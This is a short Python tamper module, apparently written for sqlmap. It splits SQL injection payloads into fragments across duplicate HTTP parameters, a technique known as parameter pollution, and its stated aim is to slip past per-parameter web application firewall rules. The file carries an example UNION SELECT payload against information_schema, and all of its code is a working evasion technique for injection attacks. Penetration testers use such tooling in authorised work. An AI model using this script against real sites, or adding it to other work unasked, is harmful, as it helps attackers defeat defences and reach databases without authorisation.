import re
import random

__example_payload__ = "' UNION SELECT NULL,NULL FROM information_schema.tables--"
__type__ = "HPP parameter splitting: fragments the payload across duplicate parameters to evade per-param WAF rules"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "NULL",
                "ORDER", "GROUP", "BY", "HAVING", "INSERT", "UPDATE", "DELETE",
                "EXEC", "TABLE", "INFORMATION_SCHEMA", "SLEEP", "WAITFOR"]

    tokens = re.split(r'(\s+|--|#|/\*|\*/|;)', payload)
    parts = []
    current = ""
    kw_count = 0
    mid_point = len(tokens) // (random.randint(2, 4))

    for i, token in enumerate(tokens):
        current += token
        upper = token.strip().upper()
        is_kw = any(upper == kw or upper.startswith(kw) for kw in keywords)
        if is_kw:
            kw_count += 1
        if (is_kw and kw_count >= 2) or i >= mid_point:
            parts.append(current)
            current = ""
            kw_count = 0
            mid_point = i + len(tokens) // (random.randint(2, 4))

    if current:
        parts.append(current)

    if len(parts) < 2:
        return payload

    # Build HPP-style param string
    params = ["q", "id", "s", "search", "query", "p", "keyword", "term", "page", "cat", "sort", "filter"]
    chosen = random.sample(params, min(len(parts), len(params)))

    retval = ""
    for i, part in enumerate(parts):
        if i == 0:
            retval = part
        else:
            retval += "&{}={}".format(chosen[i], part.strip())

    return retval
